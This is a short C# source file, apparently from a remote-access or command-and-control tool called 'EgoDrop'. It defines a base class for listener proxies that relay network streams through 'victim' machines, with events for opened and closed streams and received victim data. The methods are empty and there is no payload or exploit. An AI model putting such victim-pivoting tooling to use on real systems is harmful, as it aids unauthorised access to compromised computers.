using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsLtnProxy
    {
        public string m_szName { get; init; }
        public int m_nPort { get; init; }
        public string m_szDescription { get; init; }
        public clsSqlite.enProxyProtocol m_enProtocol { get; init; }

        public clsVictim m_victim { get; init; }
        public string m_szVictimID { get; init; }

        public bool m_bIsRunning = false;

        public delegate void dlgUserConnected(clsLtnProxy ltnProxy);
        public event dlgUserConnected OnUserConnected;
        public delegate void dlgProxyOpened(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, string szVictimID);
        public event dlgProxyOpened OnProxyOpened;
        public delegate void dlgProxyClosed(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, string szVictimID);
        public event dlgProxyClosed OnProxyClosed;
        public delegate void dlgVictimOnData(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, string szVictimID, byte[] abData);
        public event dlgVictimOnData OnRecvVictimData;

        public clsLtnProxy()
        {

        }

        public async virtual void fnStart()
        {

        }

        public async virtual void fnStop()
        {

        }

        public void fnOnProxyOpened(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, string szVictimID)
        {
            OnProxyOpened?.Invoke(ltnProxy, nStreamId, victim, szVictimID);
        }



        public void fnOnRecvVictimData(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim, string szVictimID, byte[] abData)
        {
            OnRecvVictimData?.Invoke(ltnProxy, nStreamId, victim, szVictimID, abData);
        }
    }
}
